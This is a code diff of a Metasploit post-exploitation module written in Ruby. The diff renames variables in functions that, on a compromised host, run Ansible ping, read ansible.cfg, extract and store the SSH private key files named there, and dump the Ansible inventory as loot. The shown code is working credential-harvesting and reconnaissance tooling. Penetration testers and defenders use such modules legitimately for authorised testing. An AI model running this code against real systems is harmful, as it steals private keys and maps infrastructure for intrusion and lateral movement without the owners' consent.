@@ -78,8 +78,8 @@ class MetasploitModule < Msf::Post
 
   def ping_hosts
     results = cmd_exec("#{ansible_exe} #{datastore['HOSTS']} -m ping -o")
-    l = store_loot('ansible.ping', 'text/plain', session, results, 'ansible.ping', 'Ansible ping status')
-    print_good("Stored pings to: #{l}")
+    pings = store_loot('ansible.ping', 'text/plain', session, results, 'ansible.ping', 'Ansible ping status')
+    print_good("Stored pings to: #{pings}")
     columns = ['Host', 'Status', 'Ping', 'Changed']
     table = Rex::Text::Table.new('Header' => 'Ansible Pings', 'Indent' => 1, 'Columns' => columns)
     # here's a regex with test: https://rubular.com/r/FMHhWx8QlVnidA
@@ -96,10 +96,10 @@ class MetasploitModule < Msf::Post
   def conf
     return unless file?(ansible_cfg)
 
-    f = read_file(ansible_cfg)
-    l = store_loot('ansible.cfg', 'text/plain', session, f, 'ansible.cfg', 'Ansible config file')
-    print_good("Stored config to: #{l}")
-    f.lines.each do |line|
+    ansible_config = read_file(ansible_cfg)
+    stored_config = store_loot('ansible.cfg', 'text/plain', session, ansible_config, 'ansible.cfg', 'Ansible config file')
+    print_good("Stored config to: #{stored_config}")
+    ansible_config.lines.each do |line|
       next unless line.start_with?('private_key_file')
 
       file = line.split(' = ')[1].strip
@@ -107,16 +107,16 @@ class MetasploitModule < Msf::Post
       next unless file?(file)
 
       key = read_file(file)
-      l = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
-      print_good("Stored private key file to: #{l}")
+      loot = store_loot('ansible.private.key', 'text/plain', session, key, 'private.key', 'Ansible private key')
+      print_good("Stored private key file to: #{loot}")
     end
   end
 
   def hosts_list
     hosts = cmd_exec("#{ansible_inventory} --list")
     hosts = JSON.parse(hosts)
-    l = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
-    print_good("Stored inventory to: #{l}")
+    inventory = store_loot('ansible.inventory', 'application/json', session, hosts, 'ansible_inventory.json', 'Ansible inventory')
+    print_good("Stored inventory to: #{inventory}")
     columns = ['Host', 'Connection']
     table = Rex::Text::Table.new('Header' => 'Ansible Hosts', 'Indent' => 1, 'Columns' => columns)
     hosts = hosts.dig('_meta', 'hostvars')
